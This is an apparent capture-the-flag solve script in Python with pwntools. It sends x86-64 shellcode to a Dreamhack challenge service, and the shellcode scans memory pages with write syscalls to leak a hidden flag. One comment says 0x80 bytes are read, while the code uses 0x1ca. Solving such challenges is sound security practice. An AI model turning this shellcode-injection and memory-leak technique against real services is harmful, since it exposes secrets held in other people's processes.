#!/usr/bin/env python3
from pwn import *

PORT = 23513
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./find_candy', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force

            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)


sc = asm('''
    /* Start of randomized flag region */
    mov rsi, 0x080000000000

    /* stdout */
    mov edi, 1

    /* Read 0x80 bytes from each candidate */
    mov edx, 0x1ca

    /* Number of pages to scan */
    mov r8d, 0x100000

scan:
    /* write(1, candidate, 0x80) */
    mov eax, 1
    syscall

    /* Success if return value >= 0 */
    test eax, eax
    jns found

    /* Advance to next page */
    add rsi, 0x1000
    dec r8d
    jnz scan

found:
    ud2
''')

sa(b'shellcode: ', sc)

p.interactive()